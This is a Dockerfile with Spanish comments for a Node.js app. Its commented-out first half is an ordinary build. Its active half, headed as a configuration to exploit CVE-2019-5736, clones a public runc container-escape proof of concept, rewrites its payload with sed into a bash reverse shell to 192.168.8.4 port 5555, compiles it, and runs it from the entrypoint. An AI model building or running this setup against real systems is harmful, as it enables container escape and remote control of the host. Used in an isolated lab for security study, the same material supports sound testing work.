# # Usa una imagen base con Node.js
# FROM node:18-bullseye

# # Actualiza el repositorio e instala sshfs y fuse
# RUN apt-get update && apt-get install -y \
#     sshfs \
#     fuse3 \
#     postgresql-client \
#     libpq-dev && \
#     rm -rf /var/lib/apt/lists/*

# # Instalar dependencias
# WORKDIR /app
# COPY package*.json ./
# RUN npm install
# COPY . .

# # Copiar el entrypoint script al contenedor
# COPY entrypoint.sh /usr/local/bin/entrypoint.sh
# RUN chmod +x /usr/local/bin/entrypoint.sh

# # Path a clave privada para utilizar en conexión ssh con servidor
# # de archivos
# ENV SSH_KEY_PATH="/etc/secrets/id_rsa"

# # Exponer el puerto
# EXPOSE 3000

# # Usar el entrypoint para crear el archivo de clave antes de iniciar la aplicación
# ENTRYPOINT ["/usr/local/bin/entrypoint.sh"]

# # Iniciar la aplicación
# CMD ["node", "server.js"]





# CONFIGURACION DEL DOCKERFILE PARA EXPLOITAR CVE-2019-5736

# Usa una imagen base con Node.js
FROM node:18-bullseye

# Actualiza el repositorio e instala dependencias (incluyendo Go y git para compilar el exploit)
RUN apt-get update && apt-get install -y \
    sshfs \
    fuse3 \
    postgresql-client \
    libpq-dev \
    golang \       # Necesario para compilar el exploit
    git \          # Para clonar el repositorio del exploit
    && rm -rf /var/lib/apt/lists/*

# Instalar dependencias
WORKDIR /app
COPY package*.json ./
RUN npm install
COPY . .

# Clonar el repositorio del exploit CVE-2019-5736-PoC
RUN git clone https://github.com/Frichetten/CVE-2019-5736-PoC

# Modificar el payload del exploit para tu IP y puerto (192.168.8.4:5555)
RUN sed -i 's|command := "/bin/sh"|command := "/bin/bash -c \x27bash -i >\x26 /dev/tcp/192.168.8.4/5555 0>\x261\x27"|g' /app/CVE-2019-5736-PoC/main.go

# Compilar el exploit
RUN cd /app/CVE-2019-5736-PoC && go build main.go

# Copiar el entrypoint script al contenedor
COPY entrypoint.sh /usr/local/bin/entrypoint.sh
RUN chmod +x /usr/local/bin/entrypoint.sh

# Path a clave privada para utilizar en conexión ssh con servidor de archivos
ENV SSH_KEY_PATH="/etc/secrets/id_rsa"

# Exponer el puerto
EXPOSE 3000

# Usar el entrypoint para ejecutar el exploit y la aplicación
ENTRYPOINT ["/usr/local/bin/entrypoint.sh"]

# Iniciar la aplicación
CMD ["node", "server.js"]
